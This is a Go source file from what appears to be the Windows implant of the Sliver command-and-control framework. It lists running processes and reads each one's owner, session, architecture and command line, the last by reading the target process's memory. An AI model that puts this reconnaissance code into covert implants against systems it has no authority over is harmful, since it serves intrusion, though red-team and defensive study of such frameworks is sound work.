//go:build windows
// +build windows

package ps

import (
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"golang.org/x/sys/windows"
)

// WindowsProcess is an implementation of Process for Windows.
type WindowsProcess struct {
	pid       int
	ppid      int
	exe       string
	owner     string
	arch      string
	cmdLine   []string
	sessionID int
}

func (p *WindowsProcess) Pid() int {
	return p.pid
}

func (p *WindowsProcess) PPid() int {
	return p.ppid
}

func (p *WindowsProcess) Executable() string {
	return p.exe
}

func (p *WindowsProcess) Owner() string {
	return p.owner
}

func (p *WindowsProcess) Architecture() string {
	return p.arch
}

func (p *WindowsProcess) CmdLine() []string {
	return p.cmdLine
}

func (p *WindowsProcess) SessionID() int {
	return p.sessionID
}

func newWindowsProcess(e *syscall.ProcessEntry32, fullInfo bool) *WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	if fullInfo {
		account, _ := getProcessOwner(e.ProcessID)
		sessionID, _ := getSessionID(e.ProcessID)
		cmdLine, _ := getCmdLine(e.ProcessID)
		arch, _ := getProcessArchitecture(e.ProcessID)

		return &WindowsProcess{
			pid:       int(e.ProcessID),
			ppid:      int(e.ParentProcessID),
			exe:       syscall.UTF16ToString(e.ExeFile[:end]),
			owner:     account,
			cmdLine:   cmdLine,
			arch:      arch,
			sessionID: sessionID,
		}
	} else {
		return &WindowsProcess{
			pid:  int(e.ProcessID),
			ppid: int(e.ParentProcessID),
			exe:  syscall.UTF16ToString(e.ExeFile[:end]),
		}
	}
}

func findProcess(pid int, fullInfo bool) (Process, error) {
	ps, err := processes(fullInfo)
	if err != nil {
		return nil, err
	}

	for _, p := range ps {
		if p.Pid() == pid {
			return p, nil
		}
	}

	return nil, nil
}

// getInfo retrieves a specified type of information about an access token.
func getInfo(t syscall.Token, class uint32, initSize int) (unsafe.Pointer, error) {
	n := uint32(initSize)
	for {
		b := make([]byte, n)
		e := syscall.GetTokenInformation(t, class, &b[0], uint32(len(b)), &n)
		if e == nil {
			return unsafe.Pointer(&b[0]), nil
		}
		if e != syscall.ERROR_INSUFFICIENT_BUFFER {
			return nil, e
		}
		if n <= uint32(len(b)) {
			return nil, e
		}
	}
}

// getTokenOwner retrieves access token t owner account information.
func getTokenOwner(t syscall.Token) (*syscall.Tokenuser, error) {
	i, e := getInfo(t, syscall.TokenUser, 50)
	if e != nil {
		return nil, e
	}
	return (*syscall.Tokenuser)(i), nil
}

func getProcessOwner(pid uint32) (owner string, err error) {
	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return
	}
	defer syscall.CloseHandle(handle)

	var token syscall.Token
	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_QUERY, &token); err != nil {
		return
	}
	defer token.Close()

	tokenUser, err := getTokenOwner(token)
	if err != nil {
		return
	}
	owner, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	owner = fmt.Sprintf("%s\\%s", domain, owner)
	return
}

func processes(fullInfo bool) ([]Process, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err = syscall.Process32First(handle, &entry); err != nil {
		return nil, err
	}

	results := make([]Process, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry, fullInfo))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			break
		}
	}

	return results, nil
}

const sizeOfUintPtr = unsafe.Sizeof(uintptr(0))

func uintptrToBytes(u *uintptr) []byte {
	return (*[sizeOfUintPtr]byte)(unsafe.Pointer(u))[:]
}

func main() {

	var u = uintptr(1025)
	fmt.Println(uintptrToBytes(&u))
}

func getCmdLine(pid uint32) ([]string, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPMODULE, pid)
	if err != nil {
		return []string{}, err
	}
	defer syscall.CloseHandle(handle)

	var module syscalls.MODULEENTRY32W
	module.DwSize = uint32(unsafe.Sizeof(module))
	if err = syscalls.Module32FirstW(windows.Handle(handle), &module); err != nil {
		return []string{}, err
	}

	proc, err := syscall.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false,
		pid,
	)
	if err != nil {
		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
	}

	var info windows.PROCESS_BASIC_INFORMATION
	err = windows.NtQueryInformationProcess(
		windows.Handle(proc),
		windows.ProcessBasicInformation,
		unsafe.Pointer(&info),
		uint32(unsafe.Sizeof(info)),
		nil,
	)
	if err != nil {
		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
	}

	var peb windows.PEB
	err = windows.ReadProcessMemory(
		windows.Handle(proc),
		uintptr(unsafe.Pointer(info.PebBaseAddress)),
		(*byte)(unsafe.Pointer(&peb)),
		unsafe.Sizeof(peb),
		nil,
	)
	if err != nil {
		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
	}

	var params windows.RTL_USER_PROCESS_PARAMETERS
	err = windows.ReadProcessMemory(
		windows.Handle(proc),
		uintptr(unsafe.Pointer(peb.ProcessParameters)),
		(*byte)(unsafe.Pointer(&params)),
		unsafe.Sizeof(params),
		nil,
	)
	if err != nil {
		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
	}

	var cmdLine []uint16 = make([]uint16, params.CommandLine.Length)
	err = windows.ReadProcessMemory(
		windows.Handle(proc),
		uintptr(unsafe.Pointer(params.CommandLine.Buffer)),
		(*byte)(unsafe.Pointer(&cmdLine[0])),
		uintptr(params.CommandLine.Length),
		nil,
	)
	if err != nil {
		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
	}

	err = syscall.CloseHandle(proc)
	if err != nil {
		return strings.Fields(syscall.UTF16ToString(module.SzExePath[:])), err
	}

	return strings.Fields(syscall.UTF16ToString(module.SzExePath[:]) + " : " + syscall.UTF16ToString(cmdLine[:])), nil
}

var nativeArch string = ""
var nativeArchLookup bool = true

func getProcessArchitecture(pid uint32) (string, error) {

	if nativeArchLookup {
		nativeArchLookup = false
		if runtime.GOARCH == "amd64" {
			nativeArch = "x86_64"
		} else {
			var is64Bit bool
			pHandle := windows.CurrentProcess()
			if uint(pHandle) == 0 {
				nativeArch = ""
			} else if err := windows.IsWow64Process(pHandle, &is64Bit); err != nil {
				nativeArch = ""
			} else {
				if !is64Bit {
					nativeArch = "x86"
				} else {
					nativeArch = "x86_64"
				}
			}
		}
	}

	proc, err := syscall.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		proc, err = syscall.OpenProcess(
			windows.PROCESS_QUERY_LIMITED_INFORMATION,
			false,
			pid,
		)
		if err != nil {
			return "", err
		}
	}

	arch := ""
	var isWow64 bool
	if err := windows.IsWow64Process(windows.Handle(proc), &isWow64); err == nil {
		if isWow64 {
			arch = "x86"
		} else {
			arch = nativeArch
		}
	}

	err = syscall.CloseHandle(proc)
	if err != nil {
		return "", err
	}

	return arch, err
}

func getSessionID(pid uint32) (int, error) {
	var sessionID uint32
	err := windows.ProcessIdToSessionId(pid, &sessionID)
	if err != nil {
		return -1, err
	}
	return int(sessionID), nil
}
